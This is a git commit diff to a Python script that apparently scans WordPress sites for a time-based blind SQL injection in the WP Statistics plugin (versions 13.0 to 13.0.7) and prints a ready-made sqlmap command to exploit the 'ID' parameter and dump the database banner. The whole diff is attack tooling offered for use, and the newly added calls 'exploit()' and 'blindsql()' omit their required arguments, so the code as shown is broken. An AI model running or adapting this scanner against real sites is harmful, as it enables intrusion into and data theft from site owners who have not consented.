0547219af90ac3a2284671d76fd833a1999517a2
lulz <39673284+Udyz@users.noreply.github.com>
2021-05-25 10:33:25 +0700

    Update wp-static-blinsql.py

--- wp-static-blinsql.py
+++ wp-static-blinsql.py
@@ -17,7 +17,7 @@ def blindsql(url):
 		print(r)
 		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
-	except requests.ConnectTimeout:
+	except (requests.ConnectTimeout, requests.exceptions.ReadTimeout):
 		print('(+) WwoowowoW maybe vuln ;)')
 		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
 		return True
@@ -28,15 +28,20 @@ def exploit(url):
 		stable_ver = re.findall('Stable tag\:(.*)', cver)[0].replace(' ', '')
 		print("(+) WP-statistical Plugin Version = " + stable_ver)
 		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
+		is_vuln = False
 		for v in vuln:
-			if stable_ver in v:
-				print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
-				blindsql(url)
-				return True
-			else:
-				print("(-) %s Target is not vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
-				return False
+			if v in stable_ver:
+				is_vuln = True
+		if is_vuln:
+			print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
+			return True
+		else:
+			print("(-) %s Target is not vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
+			return False
 	except:
 		print("(-) WP-statistical Unable to detect version.")
 		return False
+import sys
+exploit()
+blindsql()
 #follow me: tw@lotusdll () now put your author on this script ;)
